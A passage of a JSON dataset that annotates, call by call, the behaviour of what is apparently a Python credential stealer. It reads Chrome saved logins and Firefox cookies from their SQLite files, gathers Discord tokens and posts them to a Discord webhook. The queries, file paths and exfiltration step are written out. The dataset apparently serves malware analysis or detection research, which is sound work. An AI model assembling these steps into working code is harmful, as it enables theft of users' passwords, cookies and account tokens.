              "intention_description": "Extract browser cookies data",
              "intention_id": "extract_browser_cookies_data"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "localappdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "appdata, 'Google', 'Chrome', 'User Data'",
              "object_description": "Chrome user data directory path",
              "object_id": "chrome_user_data_directory",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "re.compile()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'^(profile\\s\\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE",
              "object_description": "Regular expression pattern",
              "object_id": "regex_pattern",
              "intention_description": "Browser profile detection preparation",
              "intention_id": "browser_profile_detection_preparation"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "chrome, \"Local State\"",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "chrome",
              "object_description": "Chrome user data directory path",
              "object_id": "chrome_user_data_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "re.match()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "chrome_regex, prof",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Browser profile detection preparation",
              "intention_id": "browser_profile_detection_preparation"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "chrome, prof, 'Login Data'",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "login_db",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT action_url, username_value, password_value FROM logins\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser password data",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser password data",
              "intention_id": "extract_browser_password_data"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "\"~\"",
              "object_description": "User home directory",
              "object_id": "user_home_directory",
              "intention_description": "Get user home directory",
              "intention_id": "get_user_home_directory"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.path.expanduser(\"~\"), \"AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\"",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "path, subfolder",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.path.join(path, subfolder), \"cookies.sqlite\"",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "cookies_file",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "cookies_file",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "c.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "c.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT * FROM moz_cookies\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser cookies data",
              "intention_id": "query_browser_cookies"
            },
            {
              "action_api": "c.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser cookies data",
              "intention_id": "extract_browser_cookies_data"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "LOCALAPPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "APPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "find_tokens()",
              "action_description": "Collect tokens from browsers",
              "action_id": "collect_browser_tokens",
              "object": "path",
              "object_description": "Browser data directory",
              "object_id": "browser_data_directory",
              "intention_description": "Collect browser tokens",
              "intention_id": "collect_browser_tokens"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "notrewebhook, json={\"embeds\": [embed]}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            }
          ]
        }
      ]
    }
  ]
}